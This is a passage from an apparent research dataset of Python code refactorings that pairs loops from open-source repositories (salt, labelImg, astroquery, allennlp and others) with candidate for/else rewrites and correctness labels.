        formats.extend(self._extract_akamai_formats(embed_code, video_id))
    elif video_type == 'video/youtube':
        info.update({'_type': 'url_transparent', 'ie_key': YoutubeIE.ie_key(), 'url': embed_code})
        is_youtube = True
        break
    else:
        formats.extend(self._extract_wowza_formats('http://sb.top-ix.org/videomg/_definst_/mp4:%s/playlist.m3u8' % embed_code, video_id))
    metadata_from_url(embed_code)
if not is_youtube:
    self._sort_formats(formats)
    info['formats'] = formats","break statement is executed:None
break statement is not executed:zejun1"
salt,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/salt/salt/utils/versions.py,https://github.com/saltstack/salt/tree/master/salt/utils/versions.py,LooseVersion,_cmp$50,"def _cmp(self, other):
        if isinstance(other, str):
            other = LooseVersion(other)

        string_in_version = False
        for part in self.version + other.version:
            if not isinstance(part, int):
                string_in_version = True
                break

        if string_in_version is False:
            return _LooseVersion._cmp(self, other)

        # If we reached this far, it means at least a part of the version contains a string
        # In python 3, strings and integers are not comparable
        if self._str_version == other._str_version:
            return 0
        if self._str_version < other._str_version:
            return -1
        if self._str_version > other._str_version:
            return 1","for part in self.version + other.version:
    if not isinstance(part, int):
        string_in_version = True
        break
if string_in_version is False:
    return _LooseVersion._cmp(self, other)","for part in self.version + other.version:
    if not isinstance(part, int):
        break
else:
    return _LooseVersion._cmp(self, other)","for part in self.version + other.version:
    if not isinstance(part, int):
        break
else:
    return _LooseVersion._cmp(self, other)",1,"for part in self.version + other.version:
    if not isinstance(part, int):
        string_in_version = True
        break
if string_in_version is False:
    return _LooseVersion._cmp(self, other)","break statement is executed:None
break statement is not executed:zejun1"
espresso,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/espresso/examples/roberta/wsc/wsc_utils.py,https://github.com/freewym/espresso/tree/master/examples/roberta/wsc/wsc_utils.py,,filter_noun_chunks$215,"def filter_noun_chunks(
    chunks, exclude_pronouns=False, exclude_query=None, exact_match=False
):
    if exclude_pronouns:
        chunks = [
            np
            for np in chunks
            if (np.lemma_ != ""-PRON-"" and not all(tok.pos_ == ""PRON"" for tok in np))
        ]

    if exclude_query is not None:
        excl_txt = [exclude_query.lower()]
        filtered_chunks = []
        for chunk in chunks:
            lower_chunk = chunk.text.lower()
            found = False
            for excl in excl_txt:
                if (
                    not exact_match and (lower_chunk in excl or excl in lower_chunk)
                ) or lower_chunk == excl:
                    found = True
                    break
            if not found:
                filtered_chunks.append(chunk)
        chunks = filtered_chunks

    return chunks","for excl in excl_txt:
    if not exact_match and (lower_chunk in excl or excl in lower_chunk) or lower_chunk == excl:
        found = True
        break
if not found:
    filtered_chunks.append(chunk)","for excl in excl_txt:
    if not exact_match and (lower_chunk in excl or excl in lower_chunk) or lower_chunk == excl:
        break
else:
    filtered_chunks.append(chunk)","for excl in excl_txt:
    if not exact_match and (lower_chunk in excl or excl in lower_chunk) or lower_chunk == excl:
        break
else:
    filtered_chunks.append(chunk)",1,"for excl in excl_txt:
    if not exact_match and (lower_chunk in excl or excl in lower_chunk) or lower_chunk == excl:
        found = True
        break
if not found:
    filtered_chunks.append(chunk)","break statement is executed:None
break statement is not executed:zejun1"
labelImg,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/labelImg/libs/create_ml_io.py,https://github.com/tzutalin/labelImg/tree/master/libs/create_ml_io.py,CreateMLWriter,write$25,"def write(self):
        if os.path.isfile(self.output_file):
            with open(self.output_file, ""r"") as file:
                input_data = file.read()
                output_dict = json.loads(input_data)
        else:
            output_dict = []

        output_image_dict = {
            ""image"": self.filename,
            ""annotations"": []
        }

        for shape in self.shapes:
            points = shape[""points""]

            x1 = points[0][0]
            y1 = points[0][1]
            x2 = points[1][0]
            y2 = points[2][1]

            height, width, x, y = self.calculate_coordinates(x1, x2, y1, y2)

            shape_dict = {
                ""label"": shape[""label""],
                ""coordinates"": {
                    ""x"": x,
                    ""y"": y,
                    ""width"": width,
                    ""height"": height
                }
            }
            output_image_dict[""annotations""].append(shape_dict)

        # check if image already in output
        exists = False
        for i in range(0, len(output_dict)):
            if output_dict[i][""image""] == output_image_dict[""image""]:
                exists = True
                output_dict[i] = output_image_dict
                break

        if not exists:
            output_dict.append(output_image_dict)

        Path(self.output_file).write_text(json.dumps(output_dict), ENCODE_METHOD)","for i in range(0, len(output_dict)):
    if output_dict[i]['image'] == output_image_dict['image']:
        exists = True
        output_dict[i] = output_image_dict
        break
if not exists:
    output_dict.append(output_image_dict)","for i in range(0, len(output_dict)):
    if output_dict[i]['image'] == output_image_dict['image']:
        output_dict[i] = output_image_dict
        break
else:
    output_dict.append(output_image_dict)","for i in range(0, len(output_dict)):
    if output_dict[i]['image'] == output_image_dict['image']:
        output_dict[i] = output_image_dict
        break
else:
    output_dict.append(output_image_dict)",1,"for i in range(0, len(output_dict)):
    if output_dict[i]['image'] == output_image_dict['image']:
        exists = True
        output_dict[i] = output_image_dict
        break
if not exists:
    output_dict.append(output_image_dict)","break statement is executed:None
break statement is not executed:zejun1"
astroquery,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/astroquery/astroquery/alma/core.py,https://github.com/astropy/astroquery/tree/master/astroquery/alma/core.py,AlmaClass,_login$858,"def _login(self, username=None, store_password=False,
               reenter_password=False, auth_urls=auth_urls):
        """"""
        Login to the ALMA Science Portal.

        Parameters
        ----------
        username : str, optional
            Username to the ALMA Science Portal. If not given, it should be
            specified in the config file.
        store_password : bool, optional
            Stores the password securely in your keyring. Default is False.
        reenter_password : bool, optional
            Asks for the password even if it is already stored in the
            keyring. This is the way to overwrite an already stored passwork
            on the keyring. Default is False.
        """"""

        success = False
        for auth_url in auth_urls:
            # set session cookies (they do not get set otherwise)
            cookiesetpage = self._request(""GET"",
                                          urljoin(self._get_dataarchive_url(),
                                                  'rh/forceAuthentication'),
                                          cache=False)
            self._login_cookiepage = cookiesetpage
            cookiesetpage.raise_for_status()

            if (auth_url+'/cas/login' in cookiesetpage.request.url):
                # we've hit a target, we're good
                success = True
                break
        if not success:
            raise LoginError(""Could not log in to any of the known ALMA ""
                             ""authorization portals: {0}"".format(auth_urls))

        # Check if already logged in
        loginpage = self._request(""GET"", ""https://{auth_url}/cas/login"".format(auth_url=auth_url),
                                  cache=False)
        root = BeautifulSoup(loginpage.content, 'html5lib')
        if root.find('div', class_='success'):
            log.info(""Already logged in."")
            return True

        self._auth_url = auth_url

        username, password = self._get_auth_info(username=username,
                                                 store_password=store_password,
                                                 reenter_password=reenter_password)

        # Authenticate
        log.info(""Authenticating {0} on {1} ..."".format(username, auth_url))
        # Do not cache pieces of the login process
        data = {kw: root.find('input', {'name': kw})['value']
                for kw in ('execution', '_eventId')}
        data['username'] = username
        data['password'] = password
        data['submit'] = 'LOGIN'

        login_response = self._request(""POST"", ""https://{0}/cas/login"".format(auth_url),
                                       params={'service': self._get_dataarchive_url()},
                                       data=data,
                                       cache=False)

        # save the login response for debugging purposes
        self._login_response = login_response
        # do not expose password back to user
        del data['password']
        # but save the parameters for debug purposes
        self._login_parameters = data

        authenticated = ('You have successfully logged in' in
                         login_response.text)

        if authenticated:
            log.info(""Authentication successful!"")
            self.USERNAME = username
        else:
            log.exception(""Authentication failed!"")

        return authenticated","for auth_url in auth_urls:
    cookiesetpage = self._request('GET', urljoin(self._get_dataarchive_url(), 'rh/forceAuthentication'), cache=False)
    self._login_cookiepage = cookiesetpage
    cookiesetpage.raise_for_status()
    if auth_url + '/cas/login' in cookiesetpage.request.url:
        success = True
        break
if not success:
    raise LoginError('Could not log in to any of the known ALMA authorization portals: {0}'.format(auth_urls))","for auth_url in auth_urls:
    cookiesetpage = self._request('GET', urljoin(self._get_dataarchive_url(), 'rh/forceAuthentication'), cache=False)
    self._login_cookiepage = cookiesetpage
    cookiesetpage.raise_for_status()
    if auth_url + '/cas/login' in cookiesetpage.request.url:
        break
else:
    raise LoginError('Could not log in to any of the known ALMA authorization portals: {0}'.format(auth_urls))","for auth_url in auth_urls:
    cookiesetpage = self._request('GET', urljoin(self._get_dataarchive_url(), 'rh/forceAuthentication'), cache=False)
    self._login_cookiepage = cookiesetpage
    cookiesetpage.raise_for_status()
    if auth_url + '/cas/login' in cookiesetpage.request.url:
        break
else:
    raise LoginError('Could not log in to any of the known ALMA authorization portals: {0}'.format(auth_urls))",1,"for auth_url in auth_urls:
    cookiesetpage = self._request('GET', urljoin(self._get_dataarchive_url(), 'rh/forceAuthentication'), cache=False)
    self._login_cookiepage = cookiesetpage
    cookiesetpage.raise_for_status()
    if auth_url + '/cas/login' in cookiesetpage.request.url:
        success = True
        break
if not success:
    raise LoginError('Could not log in to any of the known ALMA authorization portals: {0}'.format(auth_urls))","break statement is executed:None
break statement is not executed:zejun1"
hamster,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/hamster/waflib/Tools/fc_scan.py,https://github.com/projecthamster/hamster/tree/master/waflib/Tools/fc_scan.py,fortran_parser,tryfind_header$103,"def tryfind_header(self, filename):
		""""""
		Adds an include file to the list of nodes to process

		:param filename: file name
		:type filename: string
		""""""
		found = None
		for n in self.incpaths:
			found = n.find_resource(filename)
			if found:
				self.nodes.append(found)
				self.waiting.append(found)
				break
		if not found:
			if not filename in self.names:
				self.names.append(filename)","for n in self.incpaths:
    found = n.find_resource(filename)
    if found:
        self.nodes.append(found)
        self.waiting.append(found)
        break
if not found:
    if not filename in self.names:
        self.names.append(filename)","for n in self.incpaths:
    found = n.find_resource(filename)
    if found:
        self.nodes.append(found)
        self.waiting.append(found)
        break
else:
    if not filename in self.names:
        self.names.append(filename)","for n in self.incpaths:
    found = n.find_resource(filename)
    if found:
        self.nodes.append(found)
        self.waiting.append(found)
        break
else:
    if not filename in self.names:
        self.names.append(filename)",1,"for n in self.incpaths:
    found = n.find_resource(filename)
    if found:
        self.nodes.append(found)
        self.waiting.append(found)
        break
if not found:
    if not filename in self.names:
        self.names.append(filename)","break statement is executed:None
break statement is not executed:zejun1"
adapter-transformers,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/adapter-transformers/src/transformers/models/splinter/tokenization_splinter.py,https://github.com/Adapter-Hub/adapter-transformers/tree/master/src/transformers/models/splinter/tokenization_splinter.py,WordpieceTokenizer,tokenize$485,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, `input = ""unaffable""` wil return as output `[""un"", ""##aff"", ""##able""]`.

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through *BasicTokenizer*.

        Returns:
          A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
adapter-transformers,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/adapter-transformers/src/transformers/models/splinter/tokenization_splinter.py,https://github.com/Adapter-Hub/adapter-transformers/tree/master/src/transformers/models/splinter/tokenization_splinter.py,WordpieceTokenizer,tokenize$485,"def tokenize(self, text):
        """"""
        Tokenizes a piece of text into its word pieces. This uses a greedy longest-match-first algorithm to perform
        tokenization using the given vocabulary.

        For example, `input = ""unaffable""` wil return as output `[""un"", ""##aff"", ""##able""]`.

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through *BasicTokenizer*.

        Returns:
          A list of wordpiece tokens.
        """"""

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
AIGames,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/AIGames/AIPacman/Algorithm_1/Algorithm_1_v1/gameAPI/game.py,https://github.com/CharlesPikachu/AIGames/tree/master/AIPacman/Algorithm_1/Algorithm_1_v1/gameAPI/game.py,GamePacmanAgent,runGame$147,"def runGame(self):
		clock = pygame.time.Clock()
		is_win = False
		while True:
			for event in pygame.event.get():
				if event.type == pygame.QUIT:
					sys.exit(-1)
					pygame.quit()
			pressed_keys = pygame.key.get_pressed()
			if pressed_keys[pygame.K_UP]:
				self.pacman_sprites.update([0, -1], self.wall_sprites, None)
			elif pressed_keys[pygame.K_DOWN]:
				self.pacman_sprites.update([0, 1], self.wall_sprites, None)
			elif pressed_keys[pygame.K_LEFT]:
				self.pacman_sprites.update([-1, 0], self.wall_sprites, None)
			elif pressed_keys[pygame.K_RIGHT]:
				self.pacman_sprites.update([1, 0], self.wall_sprites, None)
			for pacman in self.pacman_sprites:
				food_eaten = pygame.sprite.spritecollide(pacman, self.food_sprites, True)
				capsule_eaten = pygame.sprite.spritecollide(pacman, self.capsule_sprites, True)
			nonscared_ghost_sprites = pygame.sprite.Group()
			dead_ghost_sprites = pygame.sprite.Group()
			for ghost in self.ghost_sprites:
				if ghost.is_scared:
					if pygame.sprite.spritecollide(ghost, self.pacman_sprites, False):
						self.score += 6
						dead_ghost_sprites.add(ghost)
				else:
					nonscared_ghost_sprites.add(ghost)
			for ghost in dead_ghost_sprites:
				ghost.reset()
			self.score += len(food_eaten) * 2
			self.score += len(capsule_eaten) * 3
			if len(capsule_eaten) > 0:
				for ghost in self.ghost_sprites:
					ghost.is_scared = True
			self.ghost_sprites.update(self.wall_sprites, None, self.config.ghost_action_method, self.pacman_sprites)
			self.screen.fill(self.config.BLACK)
			self.wall_sprites.draw(self.screen)
			self.food_sprites.draw(self.screen)
			self.capsule_sprites.draw(self.screen)
			self.pacman_sprites.draw(self.screen)
			self.ghost_sprites.draw(self.screen)
			# show the score
			text = self.font.render('SCORE: %s' % self.score, True, self.config.WHITE)
			self.screen.blit(text, (2, 2))
			# judge whether game over
			if len(self.food_sprites) == 0 and len(self.capsule_sprites) == 0:
				is_win = True
				break
			if pygame.sprite.groupcollide(self.pacman_sprites, nonscared_ghost_sprites, False, False):
				is_win = False
				break
			pygame.display.flip()
			clock.tick(10)
		if is_win:
			self.__showText(msg='You won!', position=(self.screen_width//2-50, int(self.screen_height/2.5)))
		else:
			self.__showText(msg='Game Over!', position=(self.screen_width//2-80, int(self.screen_height/2.5)))","while True:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            sys.exit(-1)
            pygame.quit()
    pressed_keys = pygame.key.get_pressed()
    if pressed_keys[pygame.K_UP]:
        self.pacman_sprites.update([0, -1], self.wall_sprites, None)
    elif pressed_keys[pygame.K_DOWN]:
        self.pacman_sprites.update([0, 1], self.wall_sprites, None)
    elif pressed_keys[pygame.K_LEFT]:
        self.pacman_sprites.update([-1, 0], self.wall_sprites, None)
    elif pressed_keys[pygame.K_RIGHT]:
        self.pacman_sprites.update([1, 0], self.wall_sprites, None)
    for pacman in self.pacman_sprites:
        food_eaten = pygame.sprite.spritecollide(pacman, self.food_sprites, True)
        capsule_eaten = pygame.sprite.spritecollide(pacman, self.capsule_sprites, True)
    nonscared_ghost_sprites = pygame.sprite.Group()
    dead_ghost_sprites = pygame.sprite.Group()
    for ghost in self.ghost_sprites:
        if ghost.is_scared:
            if pygame.sprite.spritecollide(ghost, self.pacman_sprites, False):
                self.score += 6
                dead_ghost_sprites.add(ghost)
        else:
            nonscared_ghost_sprites.add(ghost)
    for ghost in dead_ghost_sprites:
        ghost.reset()
    self.score += len(food_eaten) * 2
    self.score += len(capsule_eaten) * 3
    if len(capsule_eaten) > 0:
        for ghost in self.ghost_sprites:
            ghost.is_scared = True
    self.ghost_sprites.update(self.wall_sprites, None, self.config.ghost_action_method, self.pacman_sprites)
    self.screen.fill(self.config.BLACK)
    self.wall_sprites.draw(self.screen)
    self.food_sprites.draw(self.screen)
    self.capsule_sprites.draw(self.screen)
    self.pacman_sprites.draw(self.screen)
    self.ghost_sprites.draw(self.screen)
    text = self.font.render('SCORE: %s' % self.score, True, self.config.WHITE)
    self.screen.blit(text, (2, 2))
    if len(self.food_sprites) == 0 and len(self.capsule_sprites) == 0:
        is_win = True
        break
    if pygame.sprite.groupcollide(self.pacman_sprites, nonscared_ghost_sprites, False, False):
        is_win = False
        break
    pygame.display.flip()
    clock.tick(10)
if is_win:
    self.__showText(msg='You won!', position=(self.screen_width // 2 - 50, int(self.screen_height / 2.5)))
else:
    self.__showText(msg='Game Over!', position=(self.screen_width // 2 - 80, int(self.screen_height / 2.5)))","while True:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            sys.exit(-1)
            pygame.quit()
    pressed_keys = pygame.key.get_pressed()
    if pressed_keys[pygame.K_UP]:
        self.pacman_sprites.update([0, -1], self.wall_sprites, None)
    elif pressed_keys[pygame.K_DOWN]:
        self.pacman_sprites.update([0, 1], self.wall_sprites, None)
    elif pressed_keys[pygame.K_LEFT]:
        self.pacman_sprites.update([-1, 0], self.wall_sprites, None)
    elif pressed_keys[pygame.K_RIGHT]:
        self.pacman_sprites.update([1, 0], self.wall_sprites, None)
    for pacman in self.pacman_sprites:
        food_eaten = pygame.sprite.spritecollide(pacman, self.food_sprites, True)
        capsule_eaten = pygame.sprite.spritecollide(pacman, self.capsule_sprites, True)
    nonscared_ghost_sprites = pygame.sprite.Group()
    dead_ghost_sprites = pygame.sprite.Group()
    for ghost in self.ghost_sprites:
        if ghost.is_scared:
            if pygame.sprite.spritecollide(ghost, self.pacman_sprites, False):
                self.score += 6
                dead_ghost_sprites.add(ghost)
        else:
            nonscared_ghost_sprites.add(ghost)
    for ghost in dead_ghost_sprites:
        ghost.reset()
    self.score += len(food_eaten) * 2
    self.score += len(capsule_eaten) * 3
    if len(capsule_eaten) > 0:
        for ghost in self.ghost_sprites:
            ghost.is_scared = True
    self.ghost_sprites.update(self.wall_sprites, None, self.config.ghost_action_method, self.pacman_sprites)
    self.screen.fill(self.config.BLACK)
    self.wall_sprites.draw(self.screen)
    self.food_sprites.draw(self.screen)
    self.capsule_sprites.draw(self.screen)
    self.pacman_sprites.draw(self.screen)
    self.ghost_sprites.draw(self.screen)
    text = self.font.render('SCORE: %s' % self.score, True, self.config.WHITE)
    self.screen.blit(text, (2, 2))
    if len(self.food_sprites) == 0 and len(self.capsule_sprites) == 0:
        is_win = True
        self.__showText(msg='Game Over!', position=(self.screen_width // 2 - 80, int(self.screen_height / 2.5)))
        break
    if pygame.sprite.groupcollide(self.pacman_sprites, nonscared_ghost_sprites, False, False):
        is_win = False
        self.__showText(msg='Game Over!', position=(self.screen_width // 2 - 80, int(self.screen_height / 2.5)))
        break
    pygame.display.flip()
    clock.tick(10)
else:
    self.__showText(msg='You won!', position=(self.screen_width // 2 - 50, int(self.screen_height / 2.5)))","while True:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            sys.exit(-1)
            pygame.quit()
    pressed_keys = pygame.key.get_pressed()
    if pressed_keys[pygame.K_UP]:
        self.pacman_sprites.update([0, -1], self.wall_sprites, None)
    elif pressed_keys[pygame.K_DOWN]:
        self.pacman_sprites.update([0, 1], self.wall_sprites, None)
    elif pressed_keys[pygame.K_LEFT]:
        self.pacman_sprites.update([-1, 0], self.wall_sprites, None)
    elif pressed_keys[pygame.K_RIGHT]:
        self.pacman_sprites.update([1, 0], self.wall_sprites, None)
    for pacman in self.pacman_sprites:
        food_eaten = pygame.sprite.spritecollide(pacman, self.food_sprites, True)
        capsule_eaten = pygame.sprite.spritecollide(pacman, self.capsule_sprites, True)
    nonscared_ghost_sprites = pygame.sprite.Group()
    dead_ghost_sprites = pygame.sprite.Group()
    for ghost in self.ghost_sprites:
        if ghost.is_scared:
            if pygame.sprite.spritecollide(ghost, self.pacman_sprites, False):
                self.score += 6
                dead_ghost_sprites.add(ghost)
        else:
            nonscared_ghost_sprites.add(ghost)
    for ghost in dead_ghost_sprites:
        ghost.reset()
    self.score += len(food_eaten) * 2
    self.score += len(capsule_eaten) * 3
    if len(capsule_eaten) > 0:
        for ghost in self.ghost_sprites:
            ghost.is_scared = True
    self.ghost_sprites.update(self.wall_sprites, None, self.config.ghost_action_method, self.pacman_sprites)
    self.screen.fill(self.config.BLACK)
    self.wall_sprites.draw(self.screen)
    self.food_sprites.draw(self.screen)
    self.capsule_sprites.draw(self.screen)
    self.pacman_sprites.draw(self.screen)
    self.ghost_sprites.draw(self.screen)
    text = self.font.render('SCORE: %s' % self.score, True, self.config.WHITE)
    self.screen.blit(text, (2, 2))
    if len(self.food_sprites) == 0 and len(self.capsule_sprites) == 0:
        self.__showText(msg='You won!', position=(self.screen_width // 2 - 50, int(self.screen_height / 2.5)))
        break
    if pygame.sprite.groupcollide(self.pacman_sprites, nonscared_ghost_sprites, False, False):
        self.__showText(msg='Game Over!', position=(self.screen_width // 2 - 80, int(self.screen_height / 2.5)))
        break
    pygame.display.flip()
    clock.tick(10)
else:
    self.__showText(msg='You won!', position=(self.screen_width // 2 - 50, int(self.screen_height / 2.5)))",0,"while True:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            sys.exit(-1)
            pygame.quit()
    pressed_keys = pygame.key.get_pressed()
    if pressed_keys[pygame.K_UP]:
        self.pacman_sprites.update([0, -1], self.wall_sprites, None)
    elif pressed_keys[pygame.K_DOWN]:
        self.pacman_sprites.update([0, 1], self.wall_sprites, None)
    elif pressed_keys[pygame.K_LEFT]:
        self.pacman_sprites.update([-1, 0], self.wall_sprites, None)
    elif pressed_keys[pygame.K_RIGHT]:
        self.pacman_sprites.update([1, 0], self.wall_sprites, None)
    for pacman in self.pacman_sprites:
        food_eaten = pygame.sprite.spritecollide(pacman, self.food_sprites, True)
        capsule_eaten = pygame.sprite.spritecollide(pacman, self.capsule_sprites, True)
    nonscared_ghost_sprites = pygame.sprite.Group()
    dead_ghost_sprites = pygame.sprite.Group()
    for ghost in self.ghost_sprites:
        if ghost.is_scared:
            if pygame.sprite.spritecollide(ghost, self.pacman_sprites, False):
                self.score += 6
                dead_ghost_sprites.add(ghost)
        else:
            nonscared_ghost_sprites.add(ghost)
    for ghost in dead_ghost_sprites:
        ghost.reset()
    self.score += len(food_eaten) * 2
    self.score += len(capsule_eaten) * 3
    if len(capsule_eaten) > 0:
        for ghost in self.ghost_sprites:
            ghost.is_scared = True
    self.ghost_sprites.update(self.wall_sprites, None, self.config.ghost_action_method, self.pacman_sprites)
    self.screen.fill(self.config.BLACK)
    self.wall_sprites.draw(self.screen)
    self.food_sprites.draw(self.screen)
    self.capsule_sprites.draw(self.screen)
    self.pacman_sprites.draw(self.screen)
    self.ghost_sprites.draw(self.screen)
    text = self.font.render('SCORE: %s' % self.score, True, self.config.WHITE)
    self.screen.blit(text, (2, 2))
    if len(self.food_sprites) == 0 and len(self.capsule_sprites) == 0:
        is_win = True
        break
    if pygame.sprite.groupcollide(self.pacman_sprites, nonscared_ghost_sprites, False, False):
        is_win = False
        break
    pygame.display.flip()
    clock.tick(10)
if is_win:
    self.__showText(msg='You won!', position=(self.screen_width // 2 - 50, int(self.screen_height / 2.5)))
else:
    self.__showText(msg='Game Over!', position=(self.screen_width // 2 - 80, int(self.screen_height / 2.5)))","break statement is executed:None
break statement is not executed:zejun1"
allennlp,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/allennlp/allennlp/modules/transformer/transformer_module.py,https://github.com/allenai/allennlp/tree/master/allennlp/modules/transformer/transformer_module.py,TransformerModule,_get_relevant_submodule_state$90,"def _get_relevant_submodule_state(
        cls,
        state_dict: StateDictType,
        relevant_module: Optional[Union[str, List[str]]] = None,
    ) -> StateDictType:
        """"""
        Returns the relevant part of the `state_dict`.
        """"""
        relevant_modules: Optional[List[str]] = None
        if relevant_module:
            relevant_modules = (
                [relevant_module] if isinstance(relevant_module, str) else relevant_module
            )
        elif isinstance(cls._pretrained_relevant_module, str):
            relevant_modules = [cls._pretrained_relevant_module]
        elif isinstance(cls._pretrained_relevant_module, list):
            relevant_modules = cls._pretrained_relevant_module

        if relevant_modules:
            found = False
            for module_name in relevant_modules:
                relevant_keys = set(
                    [key for key in state_dict.keys() if key.startswith(module_name + ""."")]
                )
                if relevant_keys:
                    # Only keep elements of state dict that correspond to the relevant module.
                    state_dict = {
                        key.replace(module_name + ""."", """", 1): value
                        for key, value in state_dict.items()
                        if key in relevant_keys
                    }
                    found = True
                    break

            if not found:
                warnings.warn(
                    f""{relevant_modules} was not found at top level of state_dict!"", UserWarning
                )

        return state_dict","for module_name in relevant_modules:
    relevant_keys = set([key for key in state_dict.keys() if key.startswith(module_name + '.')])
    if relevant_keys:
        state_dict = {key.replace(module_name + '.', '', 1): value for (key, value) in state_dict.items() if key in relevant_keys}
        found = True
        break
if not found:
    warnings.warn(f'{relevant_modules} was not found at top level of state_dict!', UserWarning)","for module_name in relevant_modules:
    relevant_keys = set([key for key in state_dict.keys() if key.startswith(module_name + '.')])
    if relevant_keys:
        state_dict = {key.replace(module_name + '.', '', 1): value for (key, value) in state_dict.items() if key in relevant_keys}
        break
else:
    warnings.warn(f'{relevant_modules} was not found at top level of state_dict!', UserWarning)","for module_name in relevant_modules:
    relevant_keys = set([key for key in state_dict.keys() if key.startswith(module_name + '.')])
    if relevant_keys:
        state_dict = {key.replace(module_name + '.', '', 1): value for (key, value) in state_dict.items() if key in relevant_keys}
        break
else:
    warnings.warn(f'{relevant_modules} was not found at top level of state_dict!', UserWarning)",1,"for module_name in relevant_modules:
    relevant_keys = set([key for key in state_dict.keys() if key.startswith(module_name + '.')])
    if relevant_keys:
        state_dict = {key.replace(module_name + '.', '', 1): value for (key, value) in state_dict.items() if key in relevant_keys}
        found = True
        break
if not found:
    warnings.warn(f'{relevant_modules} was not found at top level of state_dict!', UserWarning)","break statement is executed:None
break statement is not executed:zejun1"
unknown-horizons,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/unknown-horizons/horizons/ai/aiplayer/productionbuilder.py,https://github.com/unknown-horizons/unknown-horizons/tree/master/horizons/ai/aiplayer/productionbuilder.py,ProductionBuilder,count_available_squares$197,"def count_available_squares(self, size, max_num=None):
		""""""
		Count the number of available and usable (covered by collectors) size x size squares.

		@param size: the square side length
		@param max_num: if non-None then stop counting once the number of total squares is max_num
		@return: (available squares, total squares)
		""""""

		key = (size, max_num)
		if key in self.__available_squares_cache and self.last_change_id == self.__available_squares_cache[key][0]:
			return self.__available_squares_cache[key][1]

		offsets = list(itertools.product(range(size), range(size)))
		collector_area = self.get_collector_area()

		available_squares = 0
		total_squares = 0
		for x, y in self.plan:
			ok = True
			accessible = False
			for dx, dy in offsets:
				coords = (x + dx, y + dy)
				if coords not in self.plan or self.plan[coords][0] != BUILDING_PURPOSE.NONE:
					ok = False
					break
				if coords in collector_area:
					accessible = True
			if ok:
				total_squares += 1
				if max_num is not None and total_squares >= max_num:
					break
				if accessible:
					available_squares += 1
		self.__available_squares_cache[key] = (self.last_change_id, (available_squares, total_squares))
		return self.__available_squares_cache[key][1]","for (dx, dy) in offsets:
